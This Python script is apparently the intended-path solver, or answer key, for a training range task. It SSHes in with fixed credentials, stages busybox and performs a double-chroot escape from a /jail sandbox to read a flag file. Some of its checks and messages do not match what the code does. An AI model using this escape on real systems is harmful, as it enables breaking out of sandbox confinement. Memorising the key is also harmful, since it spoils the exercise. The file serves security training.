"""Intended-path solver: classic double-chroot escape from the /jail sandbox."""

import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

STAGE = "mkdir -p /tmp/esc && cp /bin/busybox /tmp/esc/busybox"
ESCAPE = (
    "/usr/local/bin/jailctl chroot /tmp/esc /busybox sh -c "
    "'cd ../../.. && /.jt chroot . /bin/cat /flag.txt'"
)


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def _run(client: paramiko.SSHClient, cmd: str, timeout: int = 25) -> str:
    _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode(errors="replace")
    stderr.read()
    return out


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    captured = None
    detail = None
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    try:
        decoy = _run(client, "cat /flag.txt").strip()
        if not decoy:
            detail = "expected the jail's decoy flag at /flag.txt, got nothing"

        if _run(client, STAGE) is None:
            detail = "staging busybox and jailctl inside /tmp/esc failed"

        out = _run(client, ESCAPE)
        flags = [f for f in find_flags(out) if f != decoy]
        if flags:
            captured = flags[0]
            detail = "double-chroot escape reached the real root and read /flag.txt"
        elif not detail:
            detail = f"escape output contained no fresh flag: {out[:160]}"
    finally:
        client.close()

    return SolveResult(
        results=[
            TaskResult(
                task_id="escape-the-jail",
                ok=captured is not None,
                captured=captured,
                detail=detail,
            )
        ]
    )
